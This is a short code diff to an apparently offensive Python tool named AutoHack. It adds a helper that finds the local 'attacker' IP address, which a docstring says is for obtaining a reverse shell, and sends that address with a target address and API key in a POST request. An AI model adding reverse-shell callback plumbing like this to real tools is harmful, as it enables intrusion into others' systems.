@@ -2,6 +2,7 @@
 import os
 import re
 import site
+import socket
 import time
 import shlex
 import argparse
@@ -182,6 +183,19 @@ class Utils:
                  f'{Colors.CYAN}({value} {unit}){Colors.END}'
                  f'{non_tick_marks}|{Colors.CYAN}({max_value} {unit}){Colors.END}')
         return chart
+
+    @staticmethod
+    def get_attacker_address() -> str:
+        """
+        Gets ip address of attacker. This is used for
+        obtaining a reverse shell.
+
+        :return:
+        """
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
+        s.connect(('<broadcast>', 1))
+        return s.getsockname()[0]
 
 
 @dataclass
@@ -805,6 +819,7 @@ class AutoHack:
         headers = {
             'API_KEY': self.api_key,
             'target_address': self.target_address,
+            'attacker_address': Utils.get_attacker_address(),
             'scandir': self.scan_directory,
         }
         requests.post(url, files=files_to_upload, headers=headers)
